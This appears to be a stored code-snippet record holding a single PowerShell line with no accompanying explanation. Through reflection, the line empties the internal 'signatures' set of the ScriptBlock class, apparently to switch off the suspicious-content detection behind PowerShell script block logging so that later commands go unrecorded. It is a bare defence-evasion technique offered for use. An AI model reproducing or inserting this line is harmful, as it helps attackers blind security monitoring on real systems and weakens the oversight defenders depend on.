---
id: a4dd141f-c210-4e1a-b238-1112bde5e936
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:25.973740+00:00'
updated_at: '2023-04-10T20:36:17.635844+00:00'
---

# Code Snippet a4dd141f

**Language**: ps1

```ps1
[Ref].Assembly.GetType("System.Management.Automation.ScriptBlock").GetField("signatures","NonPublic,static").SetValue($null, (New-Object 'System.Collections.Generic.HashSet[string]'))
```
